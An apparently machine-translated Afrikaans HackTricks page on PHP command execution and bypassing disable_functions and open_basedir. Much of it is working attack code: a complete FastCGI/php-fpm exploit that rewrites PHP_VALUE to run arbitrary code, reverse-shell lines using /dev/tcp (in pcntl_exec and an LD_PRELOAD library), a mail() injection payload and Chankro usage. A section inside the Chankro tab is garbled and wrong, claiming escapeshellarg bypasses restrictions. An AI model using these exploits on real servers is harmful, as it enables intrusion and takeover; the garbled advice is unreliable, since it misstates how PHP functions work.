# PHP - Nuttige Funksies & disable\_functions/open\_basedir omseil

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## PHP Opdrag & Kode Uitvoering

### PHP Opdrag Uitvoering

**Nota:** 'n [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php-webshell kan die volgende funksie **outomaties** toets en omseil as sommige van hulle gedeaktiveer is.

**exec** - Gee die laaste lyn van die opdrag se uitset
```bash
echo exec("uname  -a");
```
**passthru** - Stuur bevel se uitset direk na die webblaaier
```bash
echo passthru("uname -a");
```
**sisteem** - Stuur opdraguitset direk na die blaaier en gee die laaste lyn terug
```bash
echo system("uname -a");
```
**shell\_exec** - Gee bevele uitvoer
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Dieselfde as shell\_exec()
```bash
echo `uname -a`
```
**popen** - Maak 'n lees- of skryfbuis oop na 'n proses van 'n bevel
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - Soortgelyk aan popen() maar met 'n groter mate van beheer
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - Voer 'n program uit (standaard in moderne en nie so moderne PHP moet jy die `pcntl.so` module laai om hierdie funksie te gebruik)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**pos / mb\_send\_pos** - Hierdie funksie word gebruik om e-posse te stuur, maar dit kan ook misbruik word om willekeurige bevele binne die `$options` parameter in te spuit. Dit is omdat die **php `mail` funksie** gewoonlik die `sendmail` bin√™re kode binne die stelsel aanroep en dit jou toelaat om **ekstra opsies** in te voer. Jy sal egter nie die uitset van die uitgevoerde bevel kan sien nie, dus word dit aanbeveel om 'n skulpskripsie te skep wat die uitset na 'n l√™er skryf, dit uit te voer met behulp van pos, en die uitset te druk:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Hierdie funksie kan gebruik word om 'n PHP-uitbreiding dinamies te laai. Hierdie funksie sal nie altyd teenwoordig wees nie, so jy moet nagaan of dit beskikbaar is voordat jy probeer om dit te misbruik. Lees [hierdie bladsy om te leer hoe om hierdie funksie te misbruik](disable\_functions-bypass-dl-function.md).

### PHP-kode-uitvoering

Afgesien van eval is daar ander maniere om PHP-kode uit te voer: include/require kan gebruik word vir afgele√´ kode-uitvoering in die vorm van Plaaslike L√™er Insluiting en Afgele√´ L√™er Insluiting kwesbaarhede.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable\_functions & open\_basedir

**Gedeaktiveerde funksies** is die instelling wat in `.ini` l√™ers in PHP gekonfigureer kan word wat die gebruik van die aangeduide **funksies** sal **verbied**. **Open basedir** is die instelling wat aan PHP aandui watter vouer dit kan toegang.\
Die PHP-instelling moet gekonfigureer word in die pad _/etc/php7/conf.d_ of soortgelyk.

Beide konfigurasies kan gesien word in die uitset van **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (493).png>)

## open\_basedir Oorskryding

`open_basedir` sal die vouers konfigureer wat PHP kan toegang, jy **sal nie in staat wees om enige l√™er buite** daardie vouers te skryf/lees/uit te voer nie, maar jy **sal selfs nie in staat wees om** ander gids te lys nie.\
Nietemin, as jy op een of ander manier in staat is om arbitr√™re PHP-kode uit te voer, kan jy die volgende stuk **kodes** probeer om die beperking te **omseil**.

### Gidslys met glob:// oorskryding

In hierdie eerste voorbeeld word die `glob://` protokol met 'n paar pad oorskryding gebruik:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Nota1**: In die pad kan jy ook `/e??/*` gebruik om `/etc/*` en enige ander vouer te lys.\
**Nota2**: Dit lyk asof 'n deel van die kode gekopieer is, maar dit is eintlik noodsaaklik!\
**Nota3**: Hierdie voorbeeld is slegs nuttig om vouers te lys en nie om l√™ers te lees nie

### Volledige open\_basedir omseil deur misbruik te maak van FastCGI

As jy meer wil leer oor PHP-FPM en FastCGI kan jy die [eerste afdeling van hierdie bladsy](disable\_functions-bypass-php-fpm-fastcgi.md) lees.\
As `php-fpm` gekonfigureer is, kan jy dit misbruik om heeltemal die **open\_basedir** te omseil:

![](<../../../../.gitbook/assets/image (545).png>)

![](<../../../../.gitbook/assets/image (577).png>)

Let daarop dat die eerste ding wat jy moet doen, is om te vind waar die **unix-socket van php-fpm** is. Dit word gewoonlik onder `/var/run` gevind sodat jy die vorige kode kan gebruik om die gids te lys en dit te vind.\
Kode van [hier](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Slegte versoek');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Hierdie toepassing kan nie multiplex nie [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Nuwe versoek afgekeur; te besig [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Rolwaarde onbekend [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// regte uitbuiting begin hier
if (!isset($_REQUEST['cmd'])) {
die("Kontroleer jou insette\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php lading -- Doen niks nie
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Oproep: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
Hierdie skripte sal kommunikeer met die **unix-socket van php-fpm** (gewoonlik gele√´ in /var/run as fpm gebruik word) om willekeurige kode uit te voer. Die `open_basedir` instellings sal oorskryf word deur die **PHP\_VALUE** attribuut wat gestuur word.\
Let op hoe `eval` gebruik word om die PHP-kode uit te voer wat jy binne die **cmd** parameter stuur.\
Let ook op die **uitgekommentarieerde lyn 324**, jy kan dit uitkommentarieer en die **payload sal outomaties verbind met die gegewe URL en die PHP-kode** wat daar bevat word, uitvoer.\
Besoek net `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` om die inhoud van die `/etc/passwd` l√™er te kry.

{% hint style="warning" %}
Jy mag dalk dink dat net soos ons die `open_basedir` konfigurasie oorskryf het, ons ook **`disable_functions` kan oorskryf**. Wel, probeer dit, maar dit sal nie werk nie, blykbaar kan **`disable_functions` slegs gekonfigureer word in 'n `.ini` php** konfigurasie l√™er en die veranderinge wat jy uitvoer met PHP\_VALUE sal nie effektief wees op hierdie spesifieke instelling nie.
{% endhint %}

## disable\_functions Omgang

As jy PHP-kode kan uitvoer binne 'n masjien, wil jy waarskynlik na die volgende vlak gaan en **willekeurige stelselopdragte uitvoer**. In hierdie situasie is dit gewoonlik om te ontdek dat die meeste of al die PHP **funksies** wat toelaat om **stelselopdragte uit te voer gedeaktiveer is** in **`disable_functions`.**\
Dus, kyk hoe jy hierdie beperking kan omseil (as jy kan)

### Outomatiese omseil-ontdekking

Jy kan die instrument [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) gebruik en dit sal aandui watter funksie (indien enige) jy kan gebruik om **`disable_functions` te omseil**.

### Omseiling deur ander stelsel funksies te gebruik

Keer net terug na die begin van hierdie bladsy en **kontroleer of enige van die opdrag uitvoer funksies nie gedeaktiveer is en beskikbaar is in die omgewing**. As jy net een van hulle vind, sal jy dit kan gebruik om willekeurige stelselopdragte uit te voer.

### LD\_PRELOAD omseiling

Dit is algemeen bekend dat sommige funksies in PHP soos `mail()` **bin√™re l√™ers binne die stelsel sal uitvoer**. Daarom kan jy hulle misbruik deur die omgewingsveranderlike `LD_PRELOAD` te gebruik om hulle 'n willekeurige biblioteek te laat laai wat enigiets kan uitvoer.

#### Funksies wat gebruik kan word om `disable_functions` met LD\_PRELOAD te omseil

* **`mail`**
* **`mb_send_mail`**: Doeltreffend wanneer die `php-mbstring` module ge√Ønstalleer is.
* **`imap_mail`**: Werk as die `php-imap` module teenwoordig is.
* **`libvirt_connect`**: Vereis die `php-libvirt-php` module.
* **`gnupg_init`**: Bruikbaar met die `php-gnupg` module ge√Ønstalleer.
* **`new imagick()`**: Hierdie klas kan misbruik word om beperkings te omseil. Gedetailleerde uitbuitingstegnieke kan gevind word in 'n omvattende [**verslag hier**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Jy kan [**hier**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) die fuzzing skrip vind wat gebruik is om daardie funksies te vind.

Hier is 'n biblioteek wat jy kan saamstel om die `LD_PRELOAD` omgewingsveranderlike te misbruik:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Omgang met Chankro

Ten einde hierdie verkeerde konfigurasie te misbruik, kan jy [**Chankro**](https://github.com/TarlogicSecurity/Chankro) gebruik. Dit is 'n instrument wat 'n PHP-uitbuiting sal **genereer** wat jy moet oplaai na die kwesbare bediener en dit moet uitvoer (dit benader via die web).\
**Chankro** sal binne die slagofferskyf die **biblioteek en die omgekeerde dop** skryf wat jy wil uitvoer en sal die\*\*`LD_PRELOAD` truuk + PHP `mail()`\*\* funksie gebruik om die omgekeerde dop uit te voer.

Let daarop dat ten einde **Chankro** te gebruik, `mail` en `putenv` **kan nie binne die `disable_functions` lys voorkom** nie.\
In die volgende voorbeeld kan jy sien hoe om 'n **chankro-uitbuiting** te **skep** vir **arg 64**, wat `whoami` gaan uitvoer en die uitvoer in _/tmp/chankro\_shell.out_ gaan stoor, chankro sal die **biblioteek en die nutlading** in _/tmp_ skryf en die **finale uitbuiting** gaan **bicho.php** genoem word (dit is die l√™er wat jy moet oplaai na die slagofferserver):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}

### Nuttige funksies

Hier is 'n paar nuttige PHP-funksies wat jy kan gebruik vir die omseil van `disable_functions` en `open_basedir`-beperkings:

1. **`shell_exec` om `system` te omseil**: Jy kan die `shell_exec`-funksie gebruik om die `system`-funksie te omseil aangesien dit nie deur die `disable_functions`-lys beperk word nie.

2. **`escapeshellarg` om beperkings te omseil**: Met die `escapeshellarg`-funksie kan jy spesiale karakters ontsnap om beperkings te omseil en uitvoerbare opdragte uit te voer.

3. **`proc_open` om `exec` te omseil**: Die `proc_open`-funksie kan gebruik word om die `exec`-funksie te omseil deur 'n proses te begin en met die stroom daarvan te kommunikeer.

Onthou om hierdie funksies met omsigtigheid te gebruik en slegs vir wettige doeleindes. 

{% endtab %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Indien jy vind dat die **mail** funksie geblokkeer is deur gedeaktiveerde funksies, kan jy steeds die funksie **mb\_send\_mail** gebruik.\
Meer inligting oor hierdie tegniek en Chankro hier: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" deur PHP-vermo√´ns te gebruik

Let daarop dat jy met **PHP** **l√™ers kan lees en skryf, gids kan skep en regte kan verander**.\
Jy kan selfs **databasisse dump**.\
Dalk kan jy met **PHP** die boks **enumerate** en 'n manier vind om voorregte te eskaleer/opdragte uit te voer (byvoorbeeld om 'n private ssh-sleutel te lees).

Ek het 'n webshell geskep wat dit baie maklik maak om hierdie aksies uit te voer (let daarop dat die meeste webshells jou ook hierdie opsies sal bied): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Modules/Weergawe-afhanklike omseilings

Daar is verskeie maniere om `disable\_functions` te omseil as 'n spesifieke module gebruik word of 'n spesifieke PHP-weergawe benut word:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Omseiling met FFI - Foreign Function Interface enabled**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Omseiling via mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl-uitbreiding Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funksie**](disable\_functions-bypass-dl-function.md)
* [**Hierdie uitbuiting**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - vatbaar vir klein veranderinge aan die PoC
* 7.0 - alle weergawes tot op datum
* 7.1 - alle weergawes tot op datum
* 7.2 - alle weergawes tot op datum
* 7.3 - alle weergawes tot op datum
* 7.4 - alle weergawes tot op datum
* 8.0 - alle weergawes tot op datum
* [**Vanaf 7.0 tot 8.0 uitbuiting (Unix slegs)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen-uitbuiting**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Outomatiese Gereedskap**

Die volgende skrips probeer van die hier genoemde metodes:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Ander Interessante PHP-funksies

### Lys van funksies wat terugroepings aanvaar

Hierdie funksies aanvaar 'n stringparameter wat gebruik kan word om 'n funksie van die aanvaller se keuse te roep. Afhangend van die funksie mag die aanvaller al dan nie die vermo√´ h√™ om 'n parameter oor te dra nie. In daardie geval kan 'n Inligtingsblootstellingsfunksie soos phpinfo() gebruik word.

[Terugroepings / Oproepbares](https://www.php.net/manual/en/language.types.callable.php)

[Volgende lys vanaf hier](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Inligtingsoffening

Die meeste van hierdie funksie-oproepe is nie lekplekke nie. Maar dit kan dalk 'n kwesbaarheid wees as enige van die teruggekeerde data sigbaar is vir 'n aanvaller. As 'n aanvaller phpinfo() kan sien, is dit beslis 'n kwesbaarheid.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Ander
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### L√™erstelsel Funksies

Volgens RATS is alle leerstelsel funksies in php sleg. Sommige van hierdie lyk nie baie nuttig vir die aanvaller nie. Ander is nuttiger as wat jy dalk dink. Byvoorbeeld, as allow\_url\_fopen=Aan is, kan 'n url as 'n l√™ernaam gebruik word, sodat 'n oproep na copy($\_GET\['s'], $\_GET\['d']); gebruik kan word om 'n PHP-skrips enige plek op die stelsel te laai. Ook as 'n webwerf vatbaar is vir 'n versoek wat gestuur word via GET, kan elkeen van daardie leerstelsel funksies misbruik word om 'n aanval na 'n ander gasheer deur jou bediener te kanaliseer.

**Open l√™erstelselhanterer**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Skryf na l√™ersisteem (gedeeltelik in kombinasie met lees)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Lees vanaf l√™ersisteem**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
